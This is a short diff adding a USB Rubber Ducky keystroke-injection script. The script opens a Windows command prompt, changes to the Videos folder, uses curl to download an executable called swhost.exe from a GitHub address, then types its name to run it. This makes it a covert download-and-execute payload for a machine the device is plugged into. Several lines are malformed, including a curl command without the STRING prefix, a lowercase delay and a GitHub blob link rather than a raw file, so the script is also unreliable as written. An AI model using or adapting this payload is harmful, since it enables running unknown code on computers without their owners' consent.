@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 50
+STRING cd Videos
+ENTER
+delay 100
+curl -O https://github.com/Ocanath/gandalfs/blob/master/dist/swhost.exe
+DELAY 10000
+STRING swhost.exe
